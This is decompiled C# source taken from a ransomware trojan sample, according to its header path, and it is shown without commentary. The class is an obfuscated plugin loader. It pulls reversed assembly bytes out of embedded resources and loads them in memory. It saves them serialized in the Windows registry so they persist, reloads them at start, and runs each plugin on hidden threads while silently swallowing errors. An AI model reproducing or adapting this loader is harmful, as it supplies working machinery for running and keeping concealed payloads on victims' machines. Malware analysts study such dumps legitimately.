// Decompiled with JetBrains decompiler
// Type: ẍ߮ᑐᗭ৲ᗒ̛ᗫ།ཏӍᡸẗ᡽़य़ᢠ᛭༌.ৎˤ។ڗ߽њᒋ᪗᱀ռฅᗦᧂ
// Assembly: start1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B30574D9-5740-4AF1-9AAD-FBD9FE6B2A96
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-89f3ccf08032a8f789a4d56feebe797fb02d3c983b9f4783b0428640dbafc04e.exe

using Microsoft.Win32;
using Plugin;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C;

namespace ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C
{
  public class ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ
  {
    public static SortedList<Guid, byte[]> oѥ̕\u09D5ᵆᆼߊฬᶐ᱑ఆᆑ̕ᄃᵞ = new SortedList<Guid, byte[]>();
    public static SortedList<Guid, IPlugin> ᜭဳᩃᇂᜎކᎭᵮዙᶫᏽ = new SortedList<Guid, IPlugin>();
    private static string ᦜჴᝋᗆஞ\u1802ᒝᢨଈഗҪ = string.Empty;

    public static event ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.\u13F7\u0D99හ\u03A2ᤗᘙᢃ\u09F5ెኳ\u136DϢයᙢḙᠩ\u0FF8ӧ PluginAdded;

    public static void \u0BEFܾ᪈ẖˈ\u0026๔ᛋᑸᙚڸܴ()
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream serializationStream = new MemoryStream();
        binaryFormatter.Serialize((Stream) serializationStream, (object) ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.oѥ̕\u09D5ᵆᆼߊฬᶐ᱑ఆᆑ̕ᄃᵞ);
        serializationStream.Close();
        byte[] numArray = \u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ŃᦗἺٲၢ\u1CFDڜ\u0AFF೮ଣٴ(serializationStream.ToArray(), false);
        if (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.حᝊఠ௯ड\u09DE == RegistryHive.CurrentUser)
          Registry.CurrentUser.CreateSubKey(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u1AE9ᬲᆉἡᙝͮີ᪉).SetValue(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ݷᔓ\u10CAഐᶍثוᑋᩧ\u1B6A\u0E71\u0DE3੩ᒃұ\u1AE3ṐӰ\u0ECE, (object) numArray);
        else
          Registry.LocalMachine.CreateSubKey(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u1AE9ᬲᆉἡᙝͮີ᪉).SetValue(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ݷᔓ\u10CAഐᶍثוᑋᩧ\u1B6A\u0E71\u0DE3੩ᒃұ\u1AE3ṐӰ\u0ECE, (object) numArray);
      }
      catch
      {
      }
    }

    public static void ᬠ\u0085ౠϩຮ\u08D2\u055A() => new Thread((ThreadStart) (() =>
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream memoryStream;
        byte[] numArray1;
        if (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.حᝊఠ௯ड\u09DE == RegistryHive.CurrentUser)
        {
          MemoryStream serializationStream = new MemoryStream(\u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᮍΐฝᬺދᆙ໔(Registry.CurrentUser.CreateSubKey(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u1AE9ᬲᆉἡᙝͮີ᪉).GetValue(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ݷᔓ\u10CAഐᶍثוᑋᩧ\u1B6A\u0E71\u0DE3੩ᒃұ\u1AE3ṐӰ\u0ECE) as byte[], false));
          ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.oѥ̕\u09D5ᵆᆼߊฬᶐ᱑ఆᆑ̕ᄃᵞ = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray1 = (byte[]) null;
        }
        else
        {
          MemoryStream serializationStream = new MemoryStream(\u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᮍΐฝᬺދᆙ໔(Registry.LocalMachine.CreateSubKey(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.\u1AE9ᬲᆉἡᙝͮີ᪉).GetValue(\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ݷᔓ\u10CAഐᶍثוᑋᩧ\u1B6A\u0E71\u0DE3੩ᒃұ\u1AE3ṐӰ\u0ECE) as byte[], false));
          ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.oѥ̕\u09D5ᵆᆼߊฬᶐ᱑ఆᆑ̕ᄃᵞ = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray1 = (byte[]) null;
        }
        foreach (byte[] numArray2 in (IEnumerable<byte[]>) ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.oѥ̕\u09D5ᵆᆼߊฬᶐ᱑ఆᆑ̕ᄃᵞ.Values)
          ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.\u1379\u0FEC\u0A55ນ\u1940ᚭ\u1AA5(numArray2);
      }
      catch
      {
      }
    })).Start();

    public static void ကᅔܥ\u02C3\u1738\u0E66\u1C92ഴا\u1C9Aᚙ\u1ADC() => new Thread((ThreadStart) (() =>
    {
      try
      {
        if (Assembly.GetExecutingAssembly().GetManifestResourceNames().Length == 0)
          return;
        ResourceManager resourceManager = new ResourceManager("p", Assembly.GetExecutingAssembly());
        int num = (int) resourceManager.GetObject("Len");
        for (int index = 0; index < num; ++index)
        {
          byte[] numArray = (byte[]) resourceManager.GetObject(index.ToString());
          Array.Reverse((Array) numArray);
          ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.\u1379\u0FEC\u0A55ນ\u1940ᚭ\u1AA5(numArray);
        }
        if (!\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ώ\u177Bṱ\u1CB1Ւ୭)
          return;
        ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.\u0BEFܾ᪈ẖˈ\u0026๔ᛋᑸᙚڸܴ();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    })).Start();

    public static bool \u1379\u0FEC\u0A55ນ\u1940ᚭ\u1AA5(byte[] _param0)
    {
      try
      {
        foreach (Type type in Assembly.Load(_param0).GetTypes())
        {
          int num = 0;
          if (type.IsClass && type.IsSubclassOf(typeof (IPlugin)))
          {
            IPlugin instance = (IPlugin) Activator.CreateInstance(type);
            if (instance.ExecuteOnLoad)
            {
              instance.Initialize();
              ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ڂẋʉgӇ\u1AA5ᡗኍሂ\u0886ç((object) null, instance, instance.ExecuteOnLoadArgs);
            }
            if (!ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.oѥ̕\u09D5ᵆᆼߊฬᶐ᱑ఆᆑ̕ᄃᵞ.ContainsKey(instance.Guid))
              ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.oѥ̕\u09D5ᵆᆼߊฬᶐ᱑ఆᆑ̕ᄃᵞ.Add(instance.Guid, _param0);
            else
              ++num;
            if (!ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᜭဳᩃᇂᜎކᎭᵮዙᶫᏽ.ContainsKey(instance.Guid))
              ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᜭဳᩃᇂᜎކᎭᵮዙᶫᏽ.Add(instance.Guid, instance);
            else
              ++num;
            ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᦜჴᝋᗆஞ\u1802ᒝᢨଈഗҪ = string.Empty;
            if (num == 2)
            {
              ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᦜჴᝋᗆஞ\u1802ᒝᢨଈഗҪ = instance.Name + ": Already Stored";
              return false;
            }
            if (ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ฝ\u16ECʱངᯂᯆఔ\u00B3ם\u086Bᮘ\u1AF9\u0A65ǖ\u0B5Bᐕ\u08BEࣤ != null)
              ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ฝ\u16ECʱངᯂᯆఔ\u00B3ם\u086Bᮘ\u1AF9\u0A65ǖ\u0B5Bᐕ\u08BEࣤ((object) null, instance);
            return true;
          }
        }
        ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᦜჴᝋᗆஞ\u1802ᒝᢨଈഗҪ = "Class with IPlugin interface not found...";
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᦜჴᝋᗆஞ\u1802ᒝᢨଈഗҪ = ex.Message;
      }
      return false;
    }

    public static bool ᒖྩᒙᙎᓾᄙჭ\u0EF4གྷְፌӤ(IPlugin _param0)
    {
      if (!ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᜭဳᩃᇂᜎކᎭᵮዙᶫᏽ.ContainsKey(_param0.Guid))
      {
        ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᜭဳᩃᇂᜎކᎭᵮዙᶫᏽ.Add(_param0.Guid, _param0);
        ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᦜჴᝋᗆஞ\u1802ᒝᢨଈഗҪ = string.Empty;
        if (ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ฝ\u16ECʱངᯂᯆఔ\u00B3ם\u086Bᮘ\u1AF9\u0A65ǖ\u0B5Bᐕ\u08BEࣤ != null)
          ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ฝ\u16ECʱངᯂᯆఔ\u00B3ם\u086Bᮘ\u1AF9\u0A65ǖ\u0B5Bᐕ\u08BEࣤ((object) null, _param0);
        return true;
      }
      ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᦜჴᝋᗆஞ\u1802ᒝᢨଈഗҪ = _param0.Name + ": Already Stored";
      return false;
    }

    public static void ᴫḞѧ\u104Dƴᜩၲ᳭\u0DF7ংȗ\u0AFBճก\u05EEຟʱϔ\u1739(Guid _param0)
    {
      if (!ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᜭဳᩃᇂᜎކᎭᵮዙᶫᏽ.ContainsKey(_param0))
        return;
      ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.oѥ̕\u09D5ᵆᆼߊฬᶐ᱑ఆᆑ̕ᄃᵞ.Remove(_param0);
      ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᜭဳᩃᇂᜎކᎭᵮዙᶫᏽ.Remove(_param0);
    }

    public static string ڛݒ\u0865ᮼଓ್() => ৎˤ\u17D4ڗ\u07FDњᒋ᪗᱀ռฅᗦᧂ.ᦜჴᝋᗆஞ\u1802ᒝᢨଈഗҪ;

    public static void ڂẋʉgӇ\u1AA5ᡗኍሂ\u0886ç(object _param0, IPlugin _param1, PluginArgs _param2) => new Thread((ThreadStart) (() =>
    {
      try
      {
        _param1.Execute(_param0, _param2);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    })).Start();

    public delegate void \u13F7\u0D99හ\u03A2ᤗᘙᢃ\u09F5ెኳ\u136DϢයᙢḙᠩ\u0FF8ӧ(
      object _param1,
      IPlugin _param2);
  }
}
